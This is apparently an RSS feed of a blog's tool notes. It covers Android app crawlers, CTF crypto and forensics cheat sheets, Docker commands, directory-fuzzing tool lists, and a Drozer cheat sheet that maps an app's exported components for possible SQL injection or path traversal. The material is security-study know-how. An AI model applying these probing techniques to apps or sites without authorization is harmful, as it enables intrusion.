<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools :: SBK Hugo Site</title><link>https://bernie6401.github.io/tools/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tools/index.xml" rel="self" type="application/rss+xml"/><item><title>$\LaTeX$ 語法筆記</title><link>https://bernie6401.github.io/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/index.html</guid><description>HackMD 是透過 MathJax 支援 $\LaTeX$ ，雖未支援所有語法，對多數人應已足夠，一起把 Web 上醜死的公式換成美美的吧～
$\LaTeX$ 語法筆記 $$ \LaTeX % 大小寫須正確 $$
\LaTeX % 大小寫須正確 $\textstyle$ $$\displaystyle$$ %comment $$ \grave apple % 標重音 $$
\grave apple % 標重音 $$ {\bf AB} % 粗體 boldface $$
{\bf AB} % 粗體 boldface $$ \bar{A} $$
\bar{A} $$ { a+b \brace c+d } $$
{ a+b \brace c+d } $$ \overline{AB} $$
\overline{AB} $$ \vec{v} $$
\vec{v} $$ \frac{b}{a} $$</description></item><item><title>App Crawler Overview</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-overview/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-overview/index.html</guid><description>Android App Crawler 目前僅針對以下功能進行查找
可以自行判斷目前activity有哪些可以interact 自行與這些interactable的view進行interact，不管是DFS或是BFS，反正就是全部都互動就對了 比較常見的 App Crawler 123 - 無法使用 seveniruby/AppCrawler 456789 - 無法使用 zhangzhao4444/Maxim - 無法使用 Eaway/AppCrawler isonic1/Appium-Native-Crawler 根據Paper Related Work Stoat :::info Ting Su, Guozhu Meng, Yuting Chen, Ke Wu, Weiming Yang, Yao Yao, Geguang Pu, Yang Liu, and Zhendong Su. 2017. Guided, stochastic model-based GUI testing of Android apps. In Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering (ESEC/FSE 2017). Association for Computing Machinery, New York, NY, USA, 245–256. https://doi.org/10.1145/3106237.3106298 ::: 詳細的說明(包含Demo影片、比較的工具、測試的App)，都可以參考 https://tingsu.github.io/files/stoat.html UI/Application Exerciser Monkey - 不會採用 這是上一篇所比較的對象之一，可以想像成一個猴子正在對一個手機上的App進行隨機互動，可能包含簡單的click, double click, long click或是swipe等等 $ adb shell monkey -p com.music.spotify -v 50000 最後面的數字代表隨機丟出多少的event給特定的App a3e - 年代久遠不採用 也是第一篇的比較對象之一 Sapienz - 無法使用 也是第一篇的比較對象之一 APE - official webpage / APE - github - github star太少且年代久遠不採用 這是第一篇有提到的工具之一 Fastbot Android - 可採用 這是前一個APE官網有提到的工具，而且開發時間還蠻近的，github star也很多，也有CSDN教學 Droidbot - 可能採用 :::info Li, Y., Yang, Z., Guo, Y., &amp; Chen, X. (2017, May). Droidbot: a lightweight ui-guided test input generator for android. In 2017 IEEE/ACM 39th International Conference on Software Engineering Companion (ICSE-C) (pp. 23-26). IEEE. ::: 年代有點久遠，但網路上的教學也蠻多的，官網也有提供範例 Androidenv - 可能採用 :::info Toyama, D., Hamel, P., Gergely, A., Comanici, G., Glaese, A., Ahmed, Z., … &amp; Precup, D. (2021). Androidenv: A reinforcement learning platform for android. arXiv preprint arXiv:2105.13231. ::: 年代較近，也有教學 實驗的來源以及標準 如果僅僅是要app本身是開源的可以從F-Droid當中去找，這個網站就是一個免費的Google Play Store，但是我要找的除了是app本身開源，後端本身也要開源，k因為這樣我才知道後端的URL有多少，如果想要知道有哪些可能可以拿來實驗的App，可以看Guided, stochastic model-based GUI testing of Android apps.這一篇論文(就是前面提到的第一篇)</description></item><item><title>App Crawler 無法使用紀錄</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/index.html</guid><description>App Crawler 無法使用紀錄 根據Android Studio官網的說明
$ java -jar crawl_launcher.jar --apk-file path/to/my/app.apk --android-sdk path/to/my/android/sdk 我已經有安裝app在手機了，所以實際的command如下
$ java -jar crawl_launcher.jar --app-package-name com.xueqiu.android --android-sdk C:\Users\Bernie\AppData\Local\Android\Sdk Preparing to crawl com.xueqiu.android Crawl started. Crawl finished. Writing logcat to D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output\com.xueqiu.android-logcat.txt SUCCESS: Found 0 crashes. Timed out waiting for crawl outputs proto file D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output\app_firebase_test_lab\crawl_outputs.proto The output directory is D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output 但全程就只有大約不到30秒就結束了，不太懂流程到底出錯在哪，而且就算沒有安裝app，再重新跑一次，居然還可以沒有出錯的跑完；又或者是，把在沒有安裝app的情況下，用官網的command跑會直接當掉，無法繼續往下繼續跑，就一整個就很怪，但網路上也沒有比較新的說明</description></item><item><title>AppCrawler</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/appcrawler/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/appcrawler/index.html</guid><description>AppCrawler 前面踩了超多坑，所以一切都以底下最新的配置為主
Infra Appium - 1.22.3 一定要是2.0.0以下(未包含)，所以不要用default latest version，可以用CLI也可以用Desktop，因為Desktop Version預設已經no longer supported，所以一定是1.22.3，而CLI安裝就需要指定(以下是已經安裝npm為前提) $ npm install -g appium@1.22.3 $ npm install -g appium-doctor 設定ANDROID_HOME和JAVA_HOME 到Windows環境變數設定 然後去看appium-doctor看necessary的部分是不是都有，一般來說可能會apkanalyzer.bat會沒有，這方面就慢慢到網路上去載android studio下載tools AppCrawler - latest (2.7.4) 就直接到github release去下載build好的jar file，不需要看其他教學是用2.4.0或是2.3.1去用stb或是maven build原本的專案 Official Link: https://github.com/seveniruby/AppCrawler/releases/tag/2.7.4 測試前 app activity name 如果已經在手機安裝好，就直接看dumpsys中該package的main activity是哪一個 $ adb shell dumpsys package com.spotify.music | grep -B 2 "android.intent.action.MAIN" -n 279- Action: "com.google.android.meet.ADDONS_SUPPORT" 280- Category: "android.intent.category.DEFAULT" 281: android.intent.action.MAIN: 282- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae 283: Action: "android.intent.action.MAIN" -- 286- Category: "android.intent.category.APP_MUSIC" 287- 7cd1a0c com.spotify.music/.main.AppIconEmeraldGreen filter 18bef55 288: Action: "android.intent.action.MAIN" -- 290- Category: "android.intent.category.DEFAULT" 291- c3efd6a com.spotify.music/.MainActivity filter 204625b 292: Action: "android.intent.action.MAIN" -- 307- android.intent.action.MUSIC_PLAYER: 308- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae 309: Action: "android.intent.action.MAIN" 另外一種方式就是用apktool反編譯後去看AndroidManifest.xml，一樣就是string search ==android.intent.action.MAIN==，但反編譯後會有一大堆files，可能會很佔空間 $ apktool d your_app.apk app package name 如果已經安裝了，就直接list package $ adb shell pm list package | grep spotify package:com.spotify.music 要不然就要用aapt去看 $ aapt d badging Spotify.apk | findstr package package: name='com.spotify.music' versionCode='116658084' versionName='8.9.58.572' platformBuildVersionName='14' platformBuildVersionCode='34' compileSdkVersion='34' compileSdkVersionCodename='14' uses-permission: name='com.sec.android.app.clockpackage.permission.READ_ALARM' 開啟appium 如何檢視有正確開啟並且有連線到 $ appium [Appium] Welcome to Appium v1.22.3 [Appium] Appium REST http interface listener started on 0.0.0.0:4723 $ curl http://127.0.0.1:4723/wd/hub/status {"value":{"build":{"version":"1.22.3"}},"sessionId":null,"status":0} 實際測試 $ java -jar appcrawler-2.7.4-hogwarts.jar --capability "appPackage=com.spotify.music,appActivity=MainActivity" 注意事項 :::danger 基本上這個tool還是依照大量截圖的方式判斷有無換頁，所以依照現在android版本的更新，開發商如果設定成無法截圖的方式，就無法做後續的測試 ::: :::danger 根據以上的步驟，還是非常有可能會遇到問題，我自己在用physical device時，最常遇到java.lang.RuntimeException: Error creating extended parser class: Could not determine whether class ‘org.pegdown.Parser$$parboiled’ has already been loaded，在使用emulator的時候，也會遇到Exception in thread “main” java.awt.image.RasterFormatException: (y + height) is outside of Raster</description></item><item><title>Command Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/command-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/command-cheat-sheet/index.html</guid><description>Command Cheat Sheet Python 基本用語 Bytes $\to$ Hex
>>> example_str = b'\x17\x10\x06Ar\xe4G\xc9\xb5\xd7y\xbc' >>> example_str.hex() '1710064172e447c9b5d779bc' Hex $\to$ String
>>> bytes.fromhex('68656c6c6f').decode('utf-8') 'hello' >>> # or >>> import binascii >>> binascii.unhexlify('68656c6c6f') b'hello" >>> # or >>> import codecs >>> decode_hex = codecs.getdecoder("hex_codec") >>> decode_hex(s)[0] b'hello' String $\to$ Hex
>>> str= 'linuxhint'.encode('utf-8') >>> str.hex() '6c696e757868696e74' Hex(String Type) $\to$ Decimal
>>> a = '123456' >>> int(a, 16) 1193046 Decimal $\to$ Hex
>>> a = 1234 >>> hex(a) '0x4d2' Hex $\to$ Binary</description></item><item><title>Crypto Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/crypto-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/crypto-cheat-sheet/index.html</guid><description>Crypto Cheat Sheet Online Tools - Classic Crypto Complex Substitution Cipher Vigenère Cipher CyberChef Substitution Cipher Solver Tool Known Key Python - pycipher libraryonline - Vigenère cipherCAP4 quipqiup Unknown KeyVigenère Cipher CodebreakerVigenere Solver RSA相關攻擊 其實整裡的文章內容都差不多
【技術分享】CTF中RSA的常見攻擊方法 Mod相關攻擊 CTF RSA Coding Tools 大數運算: gmpy2/sage math online - cocalc/sage math online - sagecell/WolframAlpha:這是一個線上的搜索引擎，但凡和數學相關的都能進行運算，使用解說可以看這裡 $ sudo apt install sagemath # or $ conda create --name sageenv sage=10.0 -c conda-forge -y # just only for wsl --- # 想要在sage中安裝python library $ sage -pip install {library name} :::spoiler To address Discrete Log Problem p = 117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283 q = 163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599 c = 0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8 g = Mod(3,p) m = discrete_log(c,g) print(hex(m)) g2 = Mod(3,q) m2 = discrete_log(c,g2) print(m2) print(hex(m2)[2:]) ::: Crypto常用library: pycryptodom $ pip install pycryptodome :::spoiler pycryptodome generate PEM file >>> from Crypto.PublicKey import RSA >>> n = 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed >>> e = 0x10001 >>> d = 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61 >>> p = 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15 >>> q = 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79 >>> key_params = (n, e, d, p, q) >>> key = RSA.construct(key_params) >>> f = open('./rsaprivatekey.pem', 'w') >>> f.write(key.exportKey().decode()) >>> f.close() ::: openssl - RSA(很清楚) :::spoiler Cheat Sheet '''AES / DES''' $ openssl des-ecb –e –in xxx.txt –out yyy.out –k password (DES encrypt) $ openssl des-ecb –d –in yyy.out –out xxx.txt –k password (DES decrypt) $ openssl des-ede3 –d –in yyy.out –out xxx.txt –k password (TDES encrypt) $ openssl aes-128-ecb –d –in yyy.out –out xxx.txt –k password (AES decrypt) '''RSA''' $ openssl genrsa –out rsa_privatekey.pem –passout pass:password –des3 1024 # (generate RSA private key) $ openssl rsa –in rsa_privatekey.pem –passin pass:password –pubout –out rsa_publickey.pem (generate RSA public key) $ openssl rsautl –encrypt –pubin –inkey rsa_publickey.pem –in xxx.txt –out yyy.txt # (use public key to encrpt) $ openssl rsaut –decrypt –ik i k n ey rsa_privatekey.pem –in yyy.txt –out xxx.txt # To print out the components of a private key to standard output $ openssl rsa -in key.pem -text -noout # 把certificate轉成pem file $ openssl openssl x509 -in cert -pubkey -noout -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- # 把單純public key的內容(n, e)(就是上面的東西)印出來 $ openssl rsa -pubin -in public.pem -text RSA Public-Key: (53 bit) Modulus: 4966306421059967 (0x11a4d45212b17f) Exponent: 65537 (0x10001) writing RSA key -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- // 產出私鑰 openssl genrsa -out key.pem 2048 // 用同一把私鑰，產出兩組不同的憑證 openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30 openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30 // 顯示公鑰是一樣 openssl x509 -pubkey -noout -in cert1.pem openssl x509 -pubkey -noout -in cert2.pem // 顯示憑證內容是不一樣 openssl x509 -inform pem -in cert2.pem openssl x509 -inform pem -in cert1.pem ::: Factoring Tools Factor DB Yafu Prime Factorization Online</description></item><item><title>Directory Fuzzing/Traversal Tools</title><link>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/index.html</guid><description>Directory Fuzzing/Traversal Tools According Survey Paper :::info Aggarwal, V., Kaur, D., Mittal, S., Prasad, T. J. S., Batra, D., &amp; Garg, A. (2023, August). A Comparative Study of Directory Fuzzing Tools. In 2023 International Conference on Circuit Power and Computing Technologies (ICCPCT) (pp. 1368-1374). IEEE. ::: feroxbuster Wfuzz gobuster Dirbuster According to CSDN Blog - 推薦幾款優秀的目錄掃描工具 7kbscan-WebPathBrute dirsearch BBScan ihoneyBakFileScan_Modify According to CSDN Blog - 滲透測試|目錄掃描 DirMap 御劍 According to Google PmWebDirScan Dirscan Dirb Dirsearch Ffuf</description></item><item><title>Docker Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/docker-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/docker-cheat-sheet/index.html</guid><description>Docker Cheat Sheet Background Docker筆記 - Docker基礎教學 Docker筆記 - 進入Container，建立並操作 PostgreSQL Container Docker筆記 - 更改Container的Configuration Docker筆記 - 讓資料遠離Container，使用 Volume、Bind Mount 與 Tmpfs Mount Docker Docker Compose與Dockerfile差別 Docker Compose 指令
Command Know docker container name $ docker ps # Then you'll find the container name at the end of the result Go into container bash shell $ docker exec -it &lt;container_name> bash # 以root的身份進入container # 極度建議以此方法進入bash $ docker exec -u root -it &lt;container_id> /bin/bash Check Log $ docker-compose logs 啟動所有的 Docker Container 指令如下 $ docker-compose up -d 停止 docker-compose 執行的所有 Container $ docker-compose stop 刪除 docker-compose 的所有 Container $ docker-compose rm Leave Container exit or ctrl-D 利用Dockerfile build一個Images並且實際跑起來 $ docker run -it --rm $(docker build -q .) /bin/sh :::spoiler 實作</description></item><item><title>Droidbot</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/droidbot/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/droidbot/index.html</guid><description>Droidbot Official Github Repo其實也說明得非常清楚，但在初次執行的時候可能會出現以下問題，按照 APP自動化全站爬取探索 ，只要修改./droidbot/app.py的line 28就可以了 :::spoiler Execution Problem
$ droidbot -a ./base.apk/Mattermost.apk -grant_perm -script ./my_pass_login_script.json -keep_app INFO:Device:disable minicap on sdk >= 32 Traceback (most recent call last): File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py", line 96, in __init__ self.app = App(app_path, output_dir=self.output_dir) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\app.py", line 28, in __init__ from androguard.core.bytecodes.apk import APK ModuleNotFoundError: No module named 'androguard.core.bytecodes' [CONNECTION] ADB is disconnected WARNING:DroidBotIme:Failed to disconnect DroidBotIME! Traceback (most recent call last): File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py", line 96, in __init__ self.app = App(app_path, output_dir=self.output_dir) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\app.py", line 28, in __init__ from androguard.core.bytecodes.apk import APK ModuleNotFoundError: No module named 'androguard.core.bytecodes' During handling of the above exception, another exception occurred: Traceback (most recent call last): File "\\?\C:\Users\berni\anaconda3\envs\mitmproxy\Scripts\droidbot-script.py", line 33, in &lt;module> sys.exit(load_entry_point('droidbot', 'console_scripts', 'droidbot')()) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\start.py", line 145, in main droidbot = DroidBot( ^^^^^^^^^ File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py", line 116, in __init__ self.stop() File "d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py", line 191, in stop if hasattr(self.input_manager.policy, "master") and \ ^^^^^^^^^^^^^^^^^^^^^^^^^ AttributeError: 'NoneType' object has no attribute 'policy' :::</description></item><item><title>Drozer Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/drozer-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/drozer-cheat-sheet/index.html</guid><description>Drozer Cheat Sheet Basic Console 基本上最常用的command就是
dz> run &lt;drozer module> &lt;optional object> # 啟動內建的module做到依稀操作 dz> help &lt;drozer module> # 查看該module的說明以及參數設定 dz> run app.package.list #列出所有已安裝的app package dz> run app.package.list -f &lt;key word> #列出特定的app package dz> run app.package.info -a &lt;app package name> # 列出該app的基本訊息 dz> run app.package.manifest &lt;app package name e.g. jakhar.aseem.diva> # 查看AndroidManifest.xml的資訊 dz> run app.package.attacksurface &lt;app package name e.g. com.mwr.example.sieve> # 查看該app有什麼攻擊面 Attack Surface: 3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限 0 broadcast receivers exported 2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal 2 services exported is debuggable 接著根據得到的資訊看要用以下哪一種的攻擊模式</description></item><item><title>Drozer/MobSF Installation</title><link>https://bernie6401.github.io/tools/others/android-related/installation/drozer_mobsf-installation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/installation/drozer_mobsf-installation/index.html</guid><description>Drozer/MobSF Installation Installation - Drozer 我是參考1的說明，但其實參考官網的也可以，我是用docker裝
Download drozer-agent &amp; Install - Download 這是要安裝在手機測試端的類似一個server的概念，而我們的電腦端也要安裝類似的東西(有好幾種方式，我是用Docker)，讓電腦和手機可以互通 $ adb install drozer-agent.apk Start a Session 打開agent app會發現右下角有一個Off，點擊後會變成On，代表這個agent已經準備好要和電腦這邊的server連接 ![Screenshot_20240603-131808](https://hackmd.io/_uploads/SkPEfC9NC.png =200x) 設定電腦的Port轉發到Android的某個Port 根據2的說明，以及官網的要求，我們必須要把電腦31415這個port的封包轉發到手機端的31415這個port Android 的 adb forward 通訊埠轉發的功能，adb forward 的功能是轉發 PC 電腦上某個埠號 (port) 資料到 Android 裝置的某個埠號 (port)，例如：下列 adb forward 指令就是將 PC 端的 port 10000 收到的資料，轉發給到 Android Device 的 port 20000
$ adb forward tcp:31415 tcp:31415 Install PC Drozer Client 看到以下畫面就代表成功了 $ docker run -it --add-host host.docker.internal:host-gateway withsecurelabs/drozer console connect --server host.docker.internal Selecting ff762fc058e91df3 (Google Pixel 6a 13) .. ..:. ..o.. .r.. ..a.. . ....... . ..nd ro..idsnemesisand..pr .otectorandroidsneme. .,sisandprotectorandroids+. ..nemesisandprotectorandroidsn:. .emesisandprotectorandroidsnemes.. ..isandp,..,rotecyayandro,..,idsnem. .isisandp..rotectorandroid..snemisis. ,andprotectorandroidsnemisisandprotec. .torandroidsnemesisandprotectorandroid. .snemisisandprotectorandroidsnemesisan: .dprotectorandroidsnemesisandprotector. drozer Console (v3.0.2) dz> Installation - MobSF 可以直接使用線上的工具，也可以用docker架在自己的電腦</description></item><item><title>Fastbot Android</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/fastbot-android/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/fastbot-android/index.html</guid><description>Fastbot Android 以下流程皆是參考CSDN-Android APP穩定性測試工具Fastbot和官方中文教學
一般使用 把repo clone下來，並且把一些檔案複製到手機 $ git clone https://github.com/bytedance/Fastbot_Android.git $ cd Fastbot_Android $ adb push fastbot-thirdpart.jar /sdcard $ adb push framework.jar /sdcard $ adb push monkeyq.jar /sdcard $ adb push libs/. /data/local/tmp/ dump apk內部會使用到的strings，並且複製到手機 $ aapt2 dump strings &lt;your apk name> > max.valid.strings $ adb push max.valid.strings /sdcard 獲取device number和package name $ adb devices List of devices attached 24121JEGR04513 device $ aapt2 dump badging "Spotify_ Music and Podcasts_8.9.60.560_APKPure.apk" | findstr "package" package: name='com.spotify.music' versionCode='116920144' versionName='8.9.60.560' platformBuildVersionName='14' platformBuildVersionCode='34' compileSdkVersion='34' compileSdkVersionCodename='14' uses-permission: name='com.sec.android.app.clockpackage.permission.READ_ALARM' 實際測試 $ adb shell CLASSPATH=/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p &lt;package name> --agent reuseq --running-minutes &lt;遍歷時長> --throttle &lt;事件頻率> -v -v --- $ adb shell CLASSPATH=/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p com.spotify.music --agent reuseq --running-minutes 1 --throttle 500 -v -v --output-directory /sdcard/fastbot_results&amp;adb pull /sdcard/fastbot_results D:\Downloads 輸入自訂Strings Download ADBKeyBoard，安裝後設定預設keyboard為ADBKeyboard $ wget https://github.com/senzhk/ADBKeyBoard/raw/master/ADBKeyboard.apk $ adb install ADBKeyboard.apk $ adb shell ime enable com.android.adbkeyboard/.AdbIME $ adb shell ime set com.android.adbkeyboard/.AdbIME 設定config並push到手機 $ echo "max.randomPickFromStringList = true" > max.config $ adb push max.config /sdcard 設定像要輸入的strings並push到手機 $ echo "test string" > max.strings $ adb push max.strings /sdcard :::info</description></item><item><title>Forensics Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/forensics-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/forensics-cheat-sheet/index.html</guid><description>Forensics Cheat Sheet Windows Where SOFTWARE: root/Windows/System32/config/SOFTWARE SYSTEM: root/Windows/System32/config/SYSTEM NTUSER.DAT: root/Users/{username}/NTUSER.DAT $MFT: root/$MFT SOFTWARE Information 原本電腦OS的基本資訊(Build Number/Product Name/): SOFTWARE/Microsoft/Windows NT/CurrentVersion 檢查SID: SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList 查看登入: SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon StartUp Run: SOFTWARE/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT(每個使用者都不一樣) UserAssit: root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist Recent Docs: root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs System Information 電腦名稱: SYSTEM/ControlSet001/Control/ComputerName/ComputerName 電腦IP/DHCP相關資訊: SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/ 時區: SYSTEM/ControlSet001/Control/TimeZoneInformation USB資訊: SYSTEM/ControlSet001/Enum/USBSTOR/ CPU架構: SYSTEM/ControlSet001/Control/Session 